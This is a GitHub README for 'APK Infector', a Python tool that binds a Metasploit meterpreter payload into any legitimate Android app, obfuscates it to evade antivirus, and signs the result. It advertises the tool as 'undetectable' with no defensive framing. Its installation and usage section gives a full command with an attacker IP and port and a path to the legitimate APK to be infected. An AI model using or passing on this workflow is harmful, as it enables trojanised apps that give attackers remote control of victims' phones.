<p align="center">
  <img src="https://github.com/PushpenderIndia/apkinfector/blob/master/img/logo.png" alt="APK Infector Logo" width=300 height=200/>
</p>

<h1 align="center">APK Infector</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3-green.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/apkinfector/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/apkinfector/releases">
    <img src="https://img.shields.io/badge/Release-1.0-blue.svg">
  </a>
    <a href="https://github.com/PushpenderIndia/apkinfector">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>

                        This small python script can do really awesome work.
                        
Advanced Android Antivirus Evasion Tool Written In Python 3 that can Embed/Bind meterpreter APK to any Legitimate APK & can completely ofusticate the meterpreter payload with different techniques.

## Features
- [x] Fully Automate Payload Creation Using MSFvenom
- [x] Creates a handler.rc File 
- [x] Undetectable
- [x] Ofusticate Meterpreter APK
- [x] Binds/Embeds Meterpreter APK with Any Legitimate APK 
- [x] Automatically Generates a Key which is used in signing
- [x] Capable to Sign APK Using **Jarsigner** or **APKsigner**
- [x] Zipalign the Signed APK
- [x] Shuffles the Permissions of Meterpreter APK for AV Evasion
- [x] Changes the default foldername and filenames which are being flagged by AV

## Tools Overview
| Front View | Sample Feature	|
| ------------  | ------------ |
|![Index](https://github.com/PushpenderIndia/apkinfector/blob/master/img/apkinfector%201.png)|![f](https://github.com/PushpenderIndia/apkinfector/blob/master/img/apkinfector%202.png)

## Prerequisite
- [x] Python 3.X
- [x] APKsigner or Jarsigner  [**One of them**]
- [x] APK Tool [**Latest**]
- [x] ZipAlign

## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - 2019.4**

## Installation & Usage

```

# Navigate to the /opt directory (optional)
$ cd /opt/

# Clone this repository
$ git clone https://github.com/PushpenderIndia/apkinfector.git

# Navigate to technowlogger folder
$ cd apkinfector

# Installing dependencies
$ apt-get update && apt-get install apktool && apt-get install zipalign && apt-get install apksigner

# Running the Tool for 1st Time
$ python3 infector.py --help

# Usage Example
$ python3 infector.py --lhost 192.168.43.70 --lport 4444 --apk-name NEW_APK_NAME --normal-apk /root/Desktop/Path/TO/Legitemate_APK_File.apk

```

## Available Arguments 
* Optional Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
| -h          | --help    | show this help message and exit |

* Required Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
|             | --lhost 192.168.44.33  | Attacker's IP Address |
|             | --lport 4444 | Attacker's Port |
| -n NORMAL_APK | --normal-apk NORMAL_APK | Absolute Path of Legitimate APK File |
|     |  --apk-name APKNAME   | APK Name (Anything You Want To Name) |

## Contribute

* All Contributors are welcome, this repo needs contributors who will improve this tool to make it best.

## Contact

singhpushpender250@gmail.com 


## Buy Me A Coffee

* Support my Open Source projects by making Donation, It really motivates me to work on more projects
* PayPal Email: `shrisatender@gmail.com` [**Please Don't Send Emails to This Address**]

## More Features Coming Soon...


